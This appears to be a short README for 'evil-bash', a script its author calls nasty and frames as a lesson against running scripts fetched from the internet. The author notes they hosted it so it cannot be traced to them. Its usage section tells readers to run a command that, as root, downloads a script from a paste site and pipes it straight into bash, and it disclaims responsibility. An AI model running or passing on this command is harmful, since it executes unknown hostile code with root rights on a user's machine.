# evil-bash
# FOR EDUCATIONAL PURPOSES ONLY
A nasty bash script, used as a lesson on why to never run scripts directly from the internet.

I don't take full credit for this as I was inspired by a user on twitter for this one. 

However, I wanted to see if I could accomplish a similar task but without linking myself to a particular website or service, that had anything higher than basic authentication (username and password). So no sign up pages, no email verification no, personally identifying details being requested. 

I feel that I accomplished this in theory.

### Use:
Simply retrieve the script and run it from the internet directly like below;  
`su -c 'curl http://ix.io/1iVu.sh | bash'`  
*always append .sh to the url so it fetchs the contents as a shell script*

### Caution:
I am not responsible for the use of this script in any way shape or form. This script was designed as research
